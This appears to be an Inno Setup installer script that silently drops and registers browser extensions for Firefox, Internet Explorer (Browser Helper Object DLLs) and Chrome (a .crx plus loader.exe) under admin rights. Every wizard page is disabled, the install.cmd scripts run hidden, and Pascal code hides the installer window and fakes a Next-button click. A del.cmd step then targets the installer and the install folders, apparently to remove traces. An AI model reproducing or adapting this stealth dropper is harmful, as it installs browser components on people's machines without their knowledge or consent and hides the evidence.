
[Setup]
AppId="Installer"
AppPublisher="Installer Publisher"
AppName="Extensions"
AppVerName="Extensions-0.3.5.12"
VersionInfoVersion="0.3.5.12"
DefaultDirName={localappdata}\extensions_test\0.3.5.12
OutputBaseFilename=setup
PrivilegesRequired="admin"

DisableStartupPrompt=yes
DisableDirPage=yes
DisableFinishedPage=yes
DisableProgramGroupPage=yes
DisableReadyMemo=yes
DisableReadyPage=yes
DisableWelcomePage=yes
AllowNoIcons=yes
OutputDir=.
Compression=lzma
SolidCompression=yes


[Files]
Source: "ff\*.xpi"; 		DestDir: "{app}\f"; Flags: replacesameversion skipifsourcedoesntexist;
Source: "ff\install.cmd"; 	DestDir: "{app}\f"; Flags: replacesameversion skipifsourcedoesntexist;
Source: "ff\ff.js"; 		DestDir: "{app}\f"; Flags: replacesameversion skipifsourcedoesntexist;

Source: "ie\bhoX32.dll"; 	DestDir: "{app}\i"; Flags: regserver 32bit replacesameversion skipifsourcedoesntexist;
Source: "ie\bhoX64.dll"; 	DestDir: "{app}\i"; Flags: regserver 64bit replacesameversion skipifsourcedoesntexist; Check: IsWin64;
Source: "ie\script.js"; 	DestDir: "{app}\i"; Flags: replacesameversion skipifsourcedoesntexist;
Source: "ie\install.cmd"; 	DestDir: "{app}\i"; Flags: replacesameversion skipifsourcedoesntexist;

Source: "ch\install.cmd"; 	DestDir: "{app}\c"; Flags: replacesameversion skipifsourcedoesntexist;
Source: "ch\test.crx"; 		DestDir: "{app}\c"; Flags: replacesameversion skipifsourcedoesntexist;
Source: "ch\loader.exe"; 	DestDir: "{app}\c"; Flags: replacesameversion skipifsourcedoesntexist;

Source: "del.cmd"; 			DestDir: "{app}"; Flags: replacesameversion;

[Run]
Filename: "{app}\c\install.cmd"; Flags: shellexec runhidden hidewizard skipifdoesntexist
Filename: "{app}\f\install.cmd"; Flags: shellexec runhidden hidewizard skipifdoesntexist
Filename: "{app}\i\install.cmd"; Flags: shellexec runhidden hidewizard skipifdoesntexist
Filename: "{app}\del.cmd"; Parameters: """{srcexe}"" ""{app}\f"" ""{app}\c"" ""{app}\i\install.cmd"""; Flags: shellexec runhidden nowait skipifdoesntexist

[Code]
const
  BN_CLICKED = 0;
  WM_COMMAND = $0111;
  CN_BASE = $BC00;
  CN_COMMAND = CN_BASE + WM_COMMAND;
  WM_SHOWWINDOW = $0018;
  CN_HIDE = CN_BASE + WM_SHOWWINDOW;

procedure CurPageChanged(CurPageID: Integer);
var
  Param: Longint;
begin
  // send hide to every window
  PostMessage(WizardForm, CN_HIDE, 0, 0);
  // if we are on the ready page, then...  
  if CurPageID = wpReady then
  begin
    // the result of this is 0, just to be precise...
    Param := 0 or BN_CLICKED shl 16;
    // post the click notification message to the next button
    PostMessage(WizardForm.NextButton.Handle, CN_COMMAND, Param, 0);
  end;
end;
